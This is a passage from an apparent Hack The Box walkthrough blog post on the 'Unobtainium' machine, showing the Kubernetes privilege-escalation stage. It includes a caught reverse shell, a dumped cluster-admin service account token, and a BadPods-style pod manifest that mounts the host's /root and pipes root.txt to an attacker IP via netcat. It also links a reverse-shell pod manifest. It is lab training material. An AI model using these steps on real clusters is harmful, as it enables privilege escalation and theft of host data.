+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvp 9002</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9002</span><br><span class="line">Ncat: Listening on 0.0.0.0:9002</span><br><span class="line">Ncat: Connection from 10.10.10.235.</span><br><span class="line">Ncat: Connection from 10.10.10.235:48266.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (1): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app<span class="comment"># whoami </span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>Boom we got the shell as devnode-deployment.</p>
+<p>Now again tranfer the kubectl executable in the box and check if we list secrets now.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/tmp<span class="comment"># chmod +x kubectl</span></span><br><span class="line"><span class="built_in">chmod</span> +x kubectl</span><br><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/tmp<span class="comment"># ./kubectl auth can-i list secrets -n kube-system</span></span><br><span class="line">&lt;p<span class="comment"># ./kubectl auth can-i list secrets -n kube-system</span></span><br><span class="line"><span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
+
+<p>Yes we have the permission now Let get the secrets.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/tmp<span class="comment"># ./kubectl get secrets -n kube-system</span></span><br><span class="line">&lt;5c-6ms8d:/tmp<span class="comment"># ./kubectl get secrets -n kube-system</span></span><br><span class="line">NAME                                             TYPE                                  DATA   AGE</span><br><span class="line">attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      96d</span><br><span class="line">bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      96d</span><br><span class="line">c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      95d</span><br><span class="line">certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      96d</span><br><span class="line">clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      96d</span><br><span class="line">coredns-token-dbp92                              kubernetes.io/service-account-token   3      96d</span><br><span class="line">cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      96d</span><br><span class="line">daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      96d</span><br><span class="line">default-token-l85f2                              kubernetes.io/service-account-token   3      96d</span><br><span class="line">deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      96d</span><br><span class="line">disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      96d</span><br><span class="line">endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      96d</span><br><span class="line">endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      96d</span><br><span class="line">endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      96d</span><br><span class="line">expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      96d</span><br><span class="line">generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      96d</span><br><span class="line">horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      96d</span><br><span class="line">job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      96d</span><br><span class="line">kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      96d</span><br><span class="line">namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      96d</span><br><span class="line">node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      96d</span><br><span class="line">persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      96d</span><br><span class="line">pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      96d</span><br><span class="line">pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      96d</span><br><span class="line">pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      96d</span><br><span class="line">replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      96d</span><br><span class="line">replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      96d</span><br><span class="line">resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      96d</span><br><span class="line">root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      96d</span><br><span class="line">service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      96d</span><br><span class="line">service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      96d</span><br><span class="line">statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      96d</span><br><span class="line">storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      96d</span><br><span class="line">token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      96d</span><br><span class="line">ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      96d</span><br></pre></td></tr></table></figure>
+
+<p>If you see the third option Cluster Administrator -&gt; c-admin-token-tfmp2 is the secret of the Cluster Administrator.</p>
+<p>Let’s get the token of Cluster Administrator -&gt; c-admin-token-tfmp2.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/tmp<span class="comment"># ./kubectl describe secrets/c-admin-token-tfmp2 -n kube-system</span></span><br><span class="line">&lt;describe secrets/c-admin-token-tfmp2 -n kube-system</span><br><span class="line">Name:         c-admin-token-tfmp2</span><br><span class="line">Namespace:    kube-system</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  kubernetes.io/service-account.name: c-admin</span><br><span class="line">              kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0</span><br><span class="line"></span><br><span class="line">Type:  kubernetes.io/service-account-token</span><br><span class="line"></span><br><span class="line">Data</span><br><span class="line">====</span><br><span class="line">ca.crt:     1066 bytes</span><br><span class="line">namespace:  11 bytes</span><br><span class="line">token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow</span><br></pre></td></tr></table></figure>
+
+<p>Let’s list the info of the token.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/tmp<span class="comment"># ./kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info</span></span><br><span class="line">&lt;579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow cluster-info</span><br><span class="line">Kubernetes control plane is running at https://10.96.0.1:443</span><br><span class="line">KubeDNS is running at https://10.96.0.1:443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy</span><br><span class="line"></span><br><span class="line">To further debug and diagnose cluster problems, use <span class="string">&#x27;kubectl cluster-info dump&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s check if we create pods or not if we can create pods we can use BadPods.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/tmp<span class="comment"># ./kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow auth can-i create pod</span></span><br><span class="line">&lt;d4JBQQYrpm6Wdm9tjbOyGL9KRsNow auth can-i create pod</span><br><span class="line"><span class="built_in">yes</span></span><br></pre></td></tr></table></figure>
+
+<p>Yes we can create pods now let’s create a BadPods. where everything is allowed with the help of BadPods.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jpc2hvcEZveC9iYWRQb2RzL3RyZWUvbWFpbi9tYW5pZmVzdHMvZXZlcnl0aGluZy1hbGxvd2Vk">Bad Pod #1: Everything allowed<i class="fa fa-external-link-alt"></i></span></li>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jpc2hvcEZveC9iYWRQb2RzL2Jsb2IvbWFpbi9tYW5pZmVzdHMvZXZlcnl0aGluZy1hbGxvd2VkL3BvZC9ldmVyeXRoaW5nLWFsbG93ZWQtZXhlYy1wb2QueWFtbA==">everything-allowed-exec-pod.yaml<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>I modify the everything-allowed-exec-pod.yaml file to get the root hash and save the file as luci.yaml.</p>
+<ul>
+<li>luci.yaml</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: some-pod</span><br><span class="line">  namespace: default</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">    - name: web</span><br><span class="line">      image: localhost:5000/dev-alpine</span><br><span class="line">      <span class="built_in">command</span>: [<span class="string">&quot;/bin/sh&quot;</span>]</span><br><span class="line">      args: [<span class="string">&quot;-c&quot;</span>, <span class="string">&#x27;cat /root/root.txt | nc -nv 10.10.14.3 9005; sleep 100000&#x27;</span>]</span><br><span class="line">      volumeMounts:</span><br><span class="line">      - mountPath: /root/</span><br><span class="line">        name: root-flag</span><br><span class="line">  volumes:</span><br><span class="line">  - hostPath:</span><br><span class="line">      path: /root/</span><br><span class="line">      <span class="built_in">type</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    name: root-flag</span><br></pre></td></tr></table></figure>
+
+<p>Change the ip and we good to go.</p>
+<p>Just tranfer the luci.yaml in target box insode &#x2F;tmp folder and start your netcat listner to get the root.txt file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/tmp<span class="comment"># wget http://10.10.14.3:8000/luci.yaml</span></span><br><span class="line">&lt;c-6ms8d:/tmp<span class="comment"># wget http://10.10.14.3:8000/luci.yaml</span></span><br><span class="line">--2021-04-23 08:50:56--  http://10.10.14.3:8000/luci.yaml</span><br><span class="line">Connecting to 10.10.14.3:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 421 [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;luci.yaml&#x27;</span></span><br><span class="line"></span><br><span class="line">     0K                                                       100% 28.2M=0s</span><br><span class="line"></span><br><span class="line">2021-04-23 08:50:57 (28.2 MB/s) - <span class="string">&#x27;luci.yaml&#x27;</span> saved [421/421]</span><br><span class="line">root@devnode-deployment-cd86fb5c-6ms8d:/tmp<span class="comment"># ./kubectl create -f luci.yaml --token eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow</span></span><br><span class="line">&lt;TJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow</span><br><span class="line">pod/some-pod created</span><br></pre></td></tr></table></figure>
+
+<p>and we get our root flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># nc -lvp 9005 &gt; root.txt</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9005</span><br><span class="line">Ncat: Listening on 0.0.0.0:9005</span><br><span class="line">Ncat: Connection from 10.10.10.235.</span><br><span class="line">Ncat: Connection from 10.10.10.235:44441.</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/unobtainium]</span><br><span class="line">└─<span class="comment"># cat root.txt                                                                                                                                  </span></span><br><span class="line">e75d930b5ede2d4e5f1dd4f54a00e5e6</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1932.jpg"></li>
+</ul>
+<p>If you want reverse shell you can use this.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Jpc2hvcEZveC9iYWRQb2RzL2Jsb2IvbWFpbi9tYW5pZmVzdHMvZXZlcnl0aGluZy1hbGxvd2VkL3BvZC9ldmVyeXRoaW5nLWFsbG93ZWQtcmV2c2hlbGwtcG9kLnlhbWw=">everything-allowed-revshell-pod.yaml<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>using wireshark caching unobtainium’s traffic flow</li>
+<li>nodejs file read</li>
+<li>Prototype Pollution</li>
+<li>Command Injection</li>
+<li>chisel port forwarding</li>
+<li>usage of kubectl</li>
+<li>inside docker container privesc via Pods</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/04/23/Unobtainium/" title="Hack-The-Box-walkthrough[Unobtainium]">https://fdlucifer.github.io/2021/04/23/Unobtainium/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/04/09/schooled/" rel="prev" title="Hack-The-Box-walkthrough[schooled]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[schooled]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/04/23/Atom/" rel="next" title="Hack-The-Box-walkthrough[Atom]">
+                  Hack-The-Box-walkthrough[Atom] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
